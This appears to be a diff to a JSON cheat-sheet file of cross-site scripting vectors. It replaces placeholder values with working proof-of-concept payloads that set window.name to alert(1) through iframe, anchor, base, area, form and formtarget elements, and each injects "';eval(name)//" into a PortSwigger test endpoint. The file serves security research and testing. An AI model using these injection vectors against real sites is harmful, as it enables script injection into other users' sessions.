@@ -65,7 +65,7 @@
     },
     {
         "description": "Set window.name via parameter on the window.open function",
-        "code": "<script>window.open(\"#\",\"PAYLOAD\")</script>",
+        "code": "<a href=# onclick=\"window.open('http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?context=js_string_single&x=%27;eval(name)\/\/','alert(1)')\">XSS</a>",
         "browsers": [
             "chrome",
             "firefox",
@@ -75,7 +75,7 @@
     },
     {
         "description": "Set window.name via name attribute in a <iframe> tag",
-        "code": "<iframe name=\"PAYLOAD\" src=\"#\"></iframe>",
+        "code": "<iframe name=\"alert(1)\" src=\"https:\/\/portswigger-labs.net\/xss\/xss.php?context=js_string_single&x=%27;eval(name)\/\/\"></iframe>",
         "browsers": [
             "chrome",
             "firefox",
@@ -85,7 +85,7 @@
     },
     {
         "description": "Set window.name via target attribute in a <base> tag",
-        "code": "<base target=\"PAYLOAD\"><a href=\"#\">XSS via target in base tag</a>",
+        "code": "<base target=\"alert(1)\"><a href=\"http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?context=js_string_single&x=%27;eval(name)\/\/\">XSS via target in base tag</a>",
         "browsers": [
             "chrome",
             "firefox",
@@ -95,7 +95,7 @@
     },
     {
         "description": "Set window.name via target attribute in a <a> tag",
-        "code": "<a target=\"PAYLOAD\" href=\"#\">XSS via target in a tag</a>",
+        "code": "<a target=\"alert(1)\" href=\"http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?context=js_string_single&x=%27;eval(name)\/\/\">XSS via target in a tag</a>",
         "browsers": [
             "chrome",
             "firefox",
@@ -105,7 +105,7 @@
     },
     {
         "description": "Set window.name via usemap attribute in a <img> tag",
-        "code": "<img src=\"#\" width=\"10\" height=\"10\" usemap=\"#xss\"><map name=\"xss\"><area shape=\"rect\" coords=\"0,0,82,126\" target=\"PAYLOAD\" href=\"#\"></map>",
+        "code": "<img src=\"validimage.png\" width=\"10\" height=\"10\" usemap=\"#xss\"><map name=\"xss\"><area shape=\"rect\" coords=\"0,0,82,126\" target=\"alert(1)\" href=\"http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?context=js_string_single&x=%27;eval(name)\/\/\"></map>",
         "browsers": [
             "chrome",
             "firefox",
@@ -115,7 +115,7 @@
     },
     {
         "description": "Set window.name via target attribute in a <form> tag",
-        "code": "<form action=\"#\" target=\"PAYLOAD\"><input type=\"submit\" value=\"XSS via target in a form\"></form>",
+        "code": "<form action=\"http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php\" target=\"alert(1)\"><input type=hidden name=x value=\"';eval(name)\/\/\"><input type=hidden name=context value=js_string_single><input type=\"submit\" value=\"XSS via target in a form\"></form>",
         "browsers": [
             "chrome",
             "firefox",
@@ -125,7 +125,7 @@
     },
     {
         "description": "Set window.name via formtarget attribute in a <input> tag type submit",
-        "code": "<form><input type=\"submit\" formaction=\"#\" formtarget=\"PAYLOAD\" value=\"XSS via formtarget in input type submit\"></form>",
+        "code": "<form><input type=hidden name=x value=\"';eval(name)\/\/\"><input type=hidden name=context value=js_string_single><input type=\"submit\" formaction=\"http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php\" formtarget=\"alert(1)\" value=\"XSS via formtarget in input type submit\"></form>",
         "browsers": [
             "chrome",
             "firefox",
@@ -135,7 +135,7 @@
     },
     {
         "description": "Set window.name via formtarget attribute in a <input> tag type image",
-        "code": "<form><input type=\"image\" src=\"\" formaction=\"#\" formtarget=\"PAYLOAD\" value=\"XSS via formtarget in input type image\"></form>",
+        "code": "<form><input type=hidden name=x value=\"';eval(name)\/\/\"><input type=hidden name=context value=js_string_single><input name=1 type=\"image\" src=\"validimage.png\" formaction=\"http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php\" formtarget=\"alert(1)\" value=\"XSS via formtarget in input type image\"></form>",
         "browsers": [
             "chrome",
             "firefox",
